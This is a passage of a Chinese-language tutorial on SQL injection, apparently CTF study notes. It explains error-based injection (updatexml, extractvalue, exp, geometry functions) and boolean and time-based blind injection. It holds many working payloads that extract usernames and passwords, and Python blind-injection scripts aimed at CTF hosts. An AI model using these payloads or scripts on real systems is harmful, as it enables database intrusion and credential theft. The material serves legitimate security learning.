0,1),floor(rand(0)*2))x</span><br></pre></td></tr></table></figure><p>可以看到这里实际上不光使用了报错注入还是用了刚刚的联合查询，同时还是一个双查询的报错注入，当在一个聚合函数，比如count()函数后面如果使用group by分组语句的话，就可能会把查询的一部分以错误的形式显示出来。但是要多次测试才可以得到报错</p><p>双查询报错注入的原理 <a href="https://blog.csdn.net/lixiangminghate/article/details/80466257%EF%BC%8Chttps://www.freebuf.com/articles/web/250376.html">https://blog.csdn.net/lixiangminghate/article/details/80466257，https://www.freebuf.com/articles/web/250376.html</a></p><p>大体思路就是当在一个聚合函数，比如count函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来，但是因为随机数要测试多次才能得到报错，上面报错注入函数中的第一个Floor()就是这种情况。</p><h3 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h3><p>对XML文档进行查询的函数</p><p>第二个参数 xml中的位置是可操作的地方，xml文档中查找字符位置是用 &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;…这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (extractvalue(‘anything’,concat(‘<span class="comment">#’,substring(hex((select database())),1,5))))</span></span><br></pre></td></tr></table></figure><h3 id="UPDATEXML-XML-document-XPath-string-new-value"><a href="#UPDATEXML-XML-document-XPath-string-new-value" class="headerlink" title="UPDATEXML (XML_document, XPath_string, new_value);"></a>UPDATEXML (XML_document, XPath_string, new_value);</h3><p>第一个参数：XML_document是String格式，为XML文档对象的名称 文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据<br>作用：改变文档中符合条件的节点的值</p><p>由于updatexml的第二个参数需要Xpath格式的字符串，如果不符合xml格式的语法，就可以实现报错注入了。</p><p>这也是一种非常常见的报错注入的函数。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; and updatexml(1,concat(0x7e,(select user()),0x7e),1)--+</span></span><br></pre></td></tr></table></figure><h3 id="exp-x"><a href="#exp-x" class="headerlink" title="exp(x)"></a>exp(x)</h3><p>返回 e 的 x 次方,当 数据过大 溢出时报错，即 x &gt; 709</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mail=<span class="string">&#x27;) or exp(~(select * from (select (concat(0x7e,(SELECT GROUP_CONCAT(user,&#x27;</span>:<span class="string">&#x27;,password) from manage),0x7e))) as asd))--+</span></span><br></pre></td></tr></table></figure><h3 id="geometrycollection-mysql-版本5-5"><a href="#geometrycollection-mysql-版本5-5" class="headerlink" title="geometrycollection() mysql 版本5.5"></a>geometrycollection() mysql 版本5.5</h3><p>（1）函数解释：<br>GeometryCollection是由1个或多个任意类几何对象构成的几何对象。GeometryCollection中的所有元素必须具有相同的空间参考系（即相同的坐标系）。</p><p>（2）官方文档中举例的用法如下：<br>GEOMETRYCOLLECTION(POINT(10 10), POINT(30 30), LINESTRING(15 15, 20 20))</p><p>（3）报错原因：<br>因为MYSQL无法使用这样的字符串画出图形，所以报错</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27;) and geometrycollection((select * from(select * from(select column_name from information_schema.columns where table_name=&#x27;</span>manage<span class="string">&#x27; limit 0,1)a)b)); %23</span></span><br><span class="line"><span class="string">1&#x27;</span>) and geometrycollection((select * from(select * from(select distinct concat(0x23,user,0x2a,password,0x23,name,0x23) FROM manage <span class="built_in">limit</span> 0,1)a)b)); %23</span><br><span class="line">1<span class="string">&#x27;) and geometrycollection((select * from(select * from(select version())a)b)); %23</span></span><br></pre></td></tr></table></figure><p>这里和我们上面学过的cancat和上一关学的内置表有两个梦幻联动</p><h3 id="multipoint-mysql-版本5-5"><a href="#multipoint-mysql-版本5-5" class="headerlink" title="multipoint() mysql 版本5.5"></a>multipoint() mysql 版本5.5</h3><p>（1）函数解释：<br>MultiPoint是一种由Point元素构成的几何对象集合。这些点未以任何方式连接或排序。<br> <br>（2）报错原因：<br>同样是因为无法使用字符串画出图形与geometrycollection类似</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27;) and multipoint((select * from(select * from(select version())a)b)); %23</span></span><br></pre></td></tr></table></figure><h3 id="polygon"><a href="#polygon" class="headerlink" title="polygon()"></a>polygon()</h3><p>polygon来自希腊。 “Poly” 意味 “many” ， “gon” 意味 “angle”.<br>Polygon是代表多边几何对象的平面Surface。它由单个外部边界以及0或多个内部边界定义，其中，每个内部边界定义为Polygon中的1个孔。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;) or polygon((select * from(select * from(select (SELECT GROUP_CONCAT(user,&#x27;</span>:<span class="string">&#x27;,password) from manage))asd)asd))--+</span></span><br></pre></td></tr></table></figure><h3 id="mutipolygon"><a href="#mutipolygon" class="headerlink" title="mutipolygon()"></a>mutipolygon()</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;) or multipolygon((select * from(select * from(select (SELECT GROUP_CONCAT(user,&#x27;</span>:<span class="string">&#x27;,password) from manage))asd)asd))</span></span><br></pre></td></tr></table></figure><h3 id="linestring-）"><a href="#linestring-）" class="headerlink" title="linestring(）"></a>linestring(）</h3><p>报错原理：<br>mysql的有些几何函数（ 例如geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring() ）对参数要求为几何数据，若不满足要求则会报错，适用于5.1-5.5版本 (5.0.中存在但是不会报错)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27;) and linestring((select * from(select * from(select database())a)b))--+;</span></span><br></pre></td></tr></table></figure><h3 id="multilinestring"><a href="#multilinestring" class="headerlink" title="multilinestring()"></a>multilinestring()</h3><p>同上</p><h3 id="ST-LatFromGeoHash-（mysql-gt-x3D-5-7-x）"><a href="#ST-LatFromGeoHash-（mysql-gt-x3D-5-7-x）" class="headerlink" title="ST.LatFromGeoHash()（mysql&gt;&#x3D;5.7.x）"></a>ST.LatFromGeoHash()（mysql&gt;&#x3D;5.7.x）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;) or ST_LatFromGeoHash((select * from(select * from(select (select (concat(0x7e,(SELECT GROUP_CONCAT(user,&#x27;</span>:<span class="string">&#x27;,password) from manage),0x7e))))a)b))--+</span></span><br></pre></td></tr></table></figure><h3 id="ST-LongFromGeoHash"><a href="#ST-LongFromGeoHash" class="headerlink" title="ST.LongFromGeoHash"></a>ST.LongFromGeoHash</h3><p>同上 嵌套查询</p><h3 id="ST-Pointfromgeohash-mysql-gt-5-7"><a href="#ST-Pointfromgeohash-mysql-gt-5-7" class="headerlink" title="ST_Pointfromgeohash (mysql&gt;5.7)"></a>ST_Pointfromgeohash (mysql&gt;5.7)</h3><p>获取数据库版本信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;)or  ST_PointFromGeoHash(version(),1)--+</span></span><br><span class="line"><span class="string">&#x27;</span>)or  ST_PointFromGeoHash((select table_name from information_schema.tables <span class="built_in">where</span> table_schema=database() <span class="built_in">limit</span> 0,1),1)--+</span><br><span class="line"><span class="string">&#x27;)or  ST_PointFromGeoHash((select column_name from information_schema.columns where table_name = &#x27;</span>manage<span class="string">&#x27; limit 0,1),1)--+</span></span><br><span class="line"><span class="string">&#x27;</span>)or  ST_PointFromGeoHash((concat(0x23,(select group_concat(user,<span class="string">&#x27;:&#x27;</span>,`password`) from manage),0x23)),1)--+</span><br></pre></td></tr></table></figure><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>SQL Injection（Blind），即SQL盲注，与一般注入的区别在于，一般的注入攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示页面上获取sql语句的执行结果，甚至连注入语句是否执行都无从得知，因此盲注的难度要比一般注入高。目前网络上现存的SQL注入漏洞大多是SQL盲注。</p><p>对于基于布尔的盲注，可通过构造真or假判断条件（数据库各项信息取值的大小比较， 如：字段长度、版本数值、字段名、字段名各组成部分在不同位置对应的字符ASCII码…）， 将构造的sql语句提交到服务器，然后根据服务器对不同的请求返回不同的页面结果 （True、False）；然后不断调整判断条件中的数值以逼近真实值，特别是需要关注响应从True&lt;–&gt;False发生变化的转折点。</p><h3 id="用到的SQL语法知识"><a href="#用到的SQL语法知识" class="headerlink" title="用到的SQL语法知识"></a>用到的SQL语法知识</h3><p>会用到截取字符的函数：substr()<br>可以直接判断字符或者根据ASCII码来判断，利用ASCII码时要用到ASCII()函数来将字符转换为ASCII码值。<br>还用到了各种运算符，&lt;，&gt;，&#x3D;当然不必多提，但是在下面POST的方式中用到了异或符号^，这里其实是一种异或注入的方法，当我们在尝试SQL注入时,发现union,and被完全过滤掉了,就可以考虑使用异或注入。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">异或运算规则:</span><br><span class="line">1^1=0 0^0=0 0^1=1</span><br><span class="line">1^1^1=0 1^1^0=0</span><br><span class="line">构造payload:<span class="string">&#x27;^ascii(mid(database(),1,1)=98)^0</span></span><br></pre></td></tr></table></figure><p>注意这里会多加一个^0或1是因为在盲注的时候可能出现了语法错误也无法判断,而改变这里的0或1,如果返回的结果是不同的,那就可以证明语法是没有问题的.</p><h3 id="注入流程"><a href="#注入流程" class="headerlink" title="注入流程"></a>注入流程</h3><p>首先通过页面对于永真条件or 1&#x3D;1 与永假条件 and 1&#x3D;2 的返回内容是否存在差异进行判断是否可以进行布尔盲注。</p><p>下面给出常用的布尔盲注脚本。</p><ul><li><p>GET型注入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">&#x27;http://474d31bb-1f69-4636-9798-319f27a7fb08.node3.buuoj.cn/&#x27;</span></span><br><span class="line"></span><br><span class="line">cookies = &#123;       <span class="comment"># 如果目标网站要事先登录，就加上cookies吧</span></span><br><span class="line">    <span class="string">&quot;PHPSESSID&quot;</span>:<span class="string">&quot;c8ab8r49nd2kk0qfhs0dcaktl3&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">90000</span>):</span><br><span class="line">   low = <span class="number">32</span></span><br><span class="line">   high = <span class="number">128</span></span><br><span class="line">   mid = (low+high)//<span class="number">2</span></span><br><span class="line">   <span class="keyword">while</span>(low&lt;high):</span><br><span class="line">       payload = <span class="string">&quot;http://474d31bb-1f69-4636-9798-319f27a7fb08.node3.buuoj.cn/Less-8/?id=0&#x27; or ascii(substr(database(),%d,1))&gt;%d-- &quot;</span> %(i,mid)    <span class="comment"># 注意get型的注入注释符要用--空格</span></span><br><span class="line">       res = requests.get(url=payload)</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> <span class="string">&#x27;You are in&#x27;</span> <span class="keyword">in</span> res.text:      <span class="comment"># 为真时，即判断正确的时候的条件</span></span><br><span class="line">           low = mid+<span class="number">1</span></span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line">           high = mid</span><br><span class="line">       mid = (low+high)//<span class="number">2</span></span><br><span class="line">   <span class="keyword">if</span>(mid ==<span class="number">32</span> <span class="keyword">or</span> mid ==<span class="number">127</span>):</span><br><span class="line">       <span class="keyword">break</span></span><br><span class="line">   flag = flag+<span class="built_in">chr</span>(mid)</span><br><span class="line">   <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></li><li><p>POST型注入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://81689af7-4cd5-432c-a88e-f5113e16c7c1.node3.buuoj.cn/index.php&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">250</span>):</span><br><span class="line">   low = <span class="number">32</span></span><br><span class="line">   high = <span class="number">128</span></span><br><span class="line">   mid = (low+high)//<span class="number">2</span></span><br><span class="line">   <span class="keyword">while</span>(low&lt;high):</span><br><span class="line">       <span class="comment">#payload = &#x27;http://d63d924a-88e3-4036-b463-9fc6a00f4fef.node3.buuoj.cn/search.php?id=1^(ascii(substr(database(),%d,1))=%d)#&#x27; %(i,mid)</span></span><br><span class="line">       payload = <span class="string">&quot;0^(ascii(substr((select(flag)from(flag)),%d,1))&gt;%d)#&quot;</span> %(i,mid)</span><br><span class="line">       datas = &#123;</span><br><span class="line">                     <span class="string">&quot;id&quot;</span>:payload</span><br><span class="line">                &#125;</span><br><span class="line">       res = requests.post(url=url,data=datas)</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> <span class="string">&#x27;girlfriend&#x27;</span> <span class="keyword">in</span> res.text:      <span class="comment"># 为真时，即判断正确的时候的条件</span></span><br><span class="line">           low = mid+<span class="number">1</span></span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line">           high = mid</span><br><span class="line">       mid = (low+high)//<span class="number">2</span></span><br><span class="line">   <span class="keyword">if</span>(mid ==<span class="number">32</span> <span class="keyword">or</span> mid ==<span class="number">127</span>):</span><br><span class="line">       <span class="keyword">break</span></span><br><span class="line">   flag = flag+<span class="built_in">chr</span>(mid)</span><br><span class="line">   <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></li></ul><p>首先，我们先分析脚本的思路，脚本利用了request库来发送请求，同时定义了一个flag字符串用来储存flag。然后写了一个for循环，封顶跑250遍，然后定义了low和high，这里根据的是ASCII码中的打印字符，定义了中间值，因为一会儿要使用的是二分法，当low&lt;high时进入while循环，执行payload是否大于mid的判断，这里GET和POST略有区别，GET传入的键值对，利用requests.post方法进行请求，GET直接把Payload拼接在url后面进行requests.get方法即可，然后根据我们判断真假的方式写一个if循环，这里的res.text是返回数据，可以先写个简单脚本看一下该怎么从其中判断真假，如果为真low&#x3D;mid+1，然后再取中间值，如果为假则high&#x3D;mid然后取中间值，直到low大于high就能确定出该位置的ASCII码了，然后最下面的if循环是排除掉在两端的特殊情况，然后每次循环打印一次flag，有时候可能还要设置延时，这里没有管。</p><p>利用异或的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=0<span class="string">&#x27;^1--+</span></span><br><span class="line"><span class="string">?id=0&#x27;</span>^0--+</span><br><span class="line">?<span class="built_in">id</span>=0<span class="string">&#x27;^(ascii(substr(database(),1,1))&gt;1)--+</span></span><br><span class="line"><span class="string">?id=0&#x27;</span>^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)<span class="built_in">where</span>(table_schema)=database()),&#123;0&#125;,1))=&#123;1&#125;)--+</span><br></pre></td></tr></table></figure><p>利用order by的</p><pre><code>该方法只适用于表里就一行数据的时候。</code></pre><p>如果注入的时候没有报错，我们又不知道列名，就只能用 order by 盲注了。当然，在 过滤了括号 的时候，order by 盲注也是个很好的办法。<br>order by 的主要作用就是让查询出来的数据根据第n列进行排序（默认升序），我们可以使用order by排序比较字符的 ascii 码大小，从第⼀位开始比较，第⼀位相同时比较下⼀位。<br>利用方式参见如下测试：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from admin <span class="built_in">where</span> username=<span class="string">&#x27;&#x27;</span> or 1 union select 1,2,<span class="string">&#x27;5&#x27;</span> order by 3;</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">| <span class="built_in">id</span> | username | password                         |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">|  1 | 2        | 5                                |</span><br><span class="line">|  1 | admin    | 51b7a76d51e70b419f60d3473fb6f900 |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">2 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from admin <span class="built_in">where</span> username=<span class="string">&#x27;&#x27;</span> or 1 union select 1,2,<span class="string">&#x27;6&#x27;</span> order by 3;</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">| <span class="built_in">id</span> | username | password                         |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">|  1 | admin    | 51b7a76d51e70b419f60d3473fb6f900 |</span><br><span class="line">|  1 | 2        | 6                                |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">2 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from admin <span class="built_in">where</span> username=<span class="string">&#x27;&#x27;</span> or 1 union select 1,2,<span class="string">&#x27;51&#x27;</span> order by 3;</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">| <span class="built_in">id</span> | username | password                         |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">|  1 | 2        | 51                               |</span><br><span class="line">|  1 | admin    | 51b7a76d51e70b419f60d3473fb6f900 |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">2 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from admin <span class="built_in">where</span> username=<span class="string">&#x27;&#x27;</span> or 1 union select 1,2,<span class="string">&#x27;52&#x27;</span> order by 3;</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">| <span class="built_in">id</span> | username | password                         |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">|  1 | admin    | 51b7a76d51e70b419f60d3473fb6f900 |</span><br><span class="line">|  1 | 2        | 52                               |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">2 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure><p>通过逐位判断便可得到password</p><p>参考脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment"># 定义一个flag取值的一个“范围”</span></span><br><span class="line">dic = <span class="string">&quot;1234567890qwertyuioplkjhgfdsazxcvbnmQWERTYUIOPLKJHGFDSAZXCVBNM_!@#$%^&amp;*&quot;</span></span><br><span class="line"><span class="comment"># 之所以不定义为空，而是“^”，是为了从头开始匹配</span></span><br><span class="line">flag = <span class="string">&quot;^&quot;</span></span><br><span class="line"><span class="comment"># 目标url，先传“|1”，获取其数据的排列内容，作为一个对比的基准</span></span><br><span class="line">url1 = <span class="string">&quot;https://chall.tasteless.eu/level1/index.php?dir=|1&quot;</span></span><br><span class="line">content1 = requests.get(url1).content</span><br><span class="line"><span class="comment"># 这个flag的长度被定义为了50个字符长度</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    <span class="comment"># 从定义的dic中挨个取1字符，拼凑payload</span></span><br><span class="line">    <span class="keyword">for</span> letter <span class="keyword">in</span> dic:</span><br><span class="line">        payload = flag + letter</span><br><span class="line">        <span class="comment">#该url最后的“&#125;2b1”--&gt;&quot;&#125;+1&quot;</span></span><br><span class="line">        url2 = <span class="string">&quot;https://chall.tasteless.eu/level1/index.php?dir=|&#123;select (select flag from level1_flag) regexp &quot;</span>+<span class="string">&quot;&#x27;&quot;</span>+ payload +<span class="string">&quot;&#x27;&quot;</span>+<span class="string">&quot;&#125;%2b1&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(url2)</span><br><span class="line">        <span class="comment"># 获取实际注入后的排列内容</span></span><br><span class="line">        content2 = requests.get(url2).content</span><br><span class="line">        <span class="comment"># 如果不相等，即为flag内容（为什么是不相等，而不是相等，因为在url2的最后又“+1”，即匹配成功则是“?dir=|2”，匹配不成功则是“?dir=|1”）</span></span><br><span class="line">        <span class="keyword">if</span>(content1 != content2):</span><br><span class="line">            flag = payload</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>有的盲注既不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断，其实也是从另一个我们能控制的角度来判断了布尔值。</p><p>对于基于时间的盲注，通过构造真or假判断条件的sql语句， 且sql语句中根据需要联合使用sleep()函数一同向服务器发送请求， 观察服务器响应结果是否会执行所设置时间的延迟响应，以此来判断所构造条件的真or假（若执行sleep延迟，则表示当前设置的判断条件为真）；然后不断调整判断条件中的数值以逼近真实值，最终确定具体的数值大小or名称拼写。</p><p>首先使用以下payload，根据页面的响应是否有延迟来判断是否存在注入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27; and sleep(5)#</span></span><br><span class="line"><span class="string">1 and sleep(5)</span></span><br></pre></td></tr></table></figure><p>时间盲注用到的SQL语法知识<br>一般的时间盲注主要就是使用sleep()函数进行时间的延迟，然后通过if判断是否执行sleep()：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27; and if(ascii(substr((select database()),1,1))&gt;1,sleep(3),0)#</span></span><br></pre></td></tr></table></figure><p>trim配合比较。</p><p>trim([both&#x2F;leading&#x2F;trailing] 目标字符串 FROM 源字符串)</p><p>从源字符串中去除首尾&#x2F;首&#x2F;尾的目标字符串，如寻找字符串第一位，假定X代表某字符，trim(leading X from ‘abcd’) &#x3D; trim(leading X+1 from ‘abcd’)不相等，说明正确结果是X或X+1再进行trim(leading X+1 from ‘abcd’) &#x3D; trim(leading X+2 from ‘abcd’) 相等则正确为X，不相等则X+1正确</p><p>若trim(leading X from ‘abcd’) &#x3D; trim(leading X+1 from ‘abcd’)相等说明X与X+1都为字符串的首字符，不存在这种情况，所以需要继续比较X+1与X+2直至相等</p><h3 id="注入流程-1"><a href="#注入流程-1" class="headerlink" title="注入流程"></a>注入流程</h3><p>时间盲注我们也是利用脚本完成：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://474d31bb-1f69-4636-9798-319f27a7fb08.node3.buuoj.cn/Less-8/?id=&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">250</span>):</span><br><span class="line">   low = <span class="number">32</span></span><br><span class="line">   high = <span class="number">128</span></span><br><span class="line">   mid = (low+high)//<span class="number">2</span></span><br><span class="line">   <span class="keyword">while</span>(low&lt;high):</span><br><span class="line"></span><br><span class="line">       payload = <span class="string">&quot;http://474d31bb-1f69-4636-9798-319f27a7fb08.node3.buuoj.cn/Less-8/?id=1&#x27; and if((ascii(substr(database(),%d,1))&gt;%d),sleep(2),1)-- &quot;</span> %(i,mid)</span><br><span class="line"></span><br><span class="line">       times = time.time()</span><br><span class="line">       res = requests.get(url=payload)</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> time.time() - times &gt;= <span class="number">2</span>:      <span class="comment"># 为真时，即判断正确的时候的条件</span></span><br><span class="line">           low = mid+<span class="number">1</span></span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line">           high = mid</span><br><span class="line">       mid = (low+high)//<span class="number">2</span></span><br><span class="line">   <span class="keyword">if</span>(mid ==<span class="number">32</span> <span class="keyword">or</span> mid ==<span class="number">127</span>):</span><br><span class="line">       <span class="keyword">break</span></span><br><span class="line">   flag = flag+<span class="built_in">chr</span>(mid)</span><br><span class="line">   <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>这是一个GET方式的时间盲注，更改脚本请求方式的方法可以参照上面的布尔盲注，这两个脚本的编写思路是一样的，只是在判断方式上有所区别。</p><p>时间盲注在CTF比赛和平时生产环境中都是比较常见的，但是当我们常⽤的函数被过滤的话，那该怎么办呢？还有以下几种时间盲注方式。</p><p>笛卡尔积延时盲注<br>count(*) 后面所有表中的列笛卡尔积数，数量越多越卡，就会有延迟，类似之前某比赛pgsql的延时注入也可以利用此来 打时间差，从而达到延时注入的效果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C;</span><br><span class="line">+-----------+</span><br><span class="line">| count(*)  |</span><br><span class="line">+-----------+</span><br><span class="line">| 113101560 |</span><br><span class="line">+-----------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (2.07 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from ctf_test <span class="built_in">where</span> user=<span class="string">&#x27;1&#x27;</span> and 1=1 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C);</span><br><span class="line">+------+-----+</span><br><span class="line">| user | <span class="built_in">pwd</span> |</span><br><span 